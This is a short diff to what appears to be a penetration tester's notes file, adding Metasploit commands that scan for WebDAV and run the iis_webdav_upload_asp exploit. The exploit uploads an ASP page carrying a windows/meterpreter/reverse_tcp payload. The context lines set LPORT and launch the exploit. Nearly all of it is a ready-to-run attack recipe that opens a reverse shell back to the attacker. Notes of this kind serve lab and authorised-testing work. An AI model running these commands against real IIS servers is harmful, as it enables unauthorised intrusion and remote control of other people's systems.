@@ -48,5 +48,14 @@ msf > set LPORT <port>
 msf > exploit
 
 http://<ip>/webdav/reverse.asp
-==> Does not work, even with .aspx and x64 payload, why?
+```
+
+```
+use auxiliary/scanner/http/webdav_scanner
+
+use exploit/windows/iis/iis_webdav_upload_asp
+set payload windows/meterpreter/reverse_tcp
+set HttpUsername <username>
+set HttpPassword <password>
+set PATH /webdav/reverse.asp
 ```
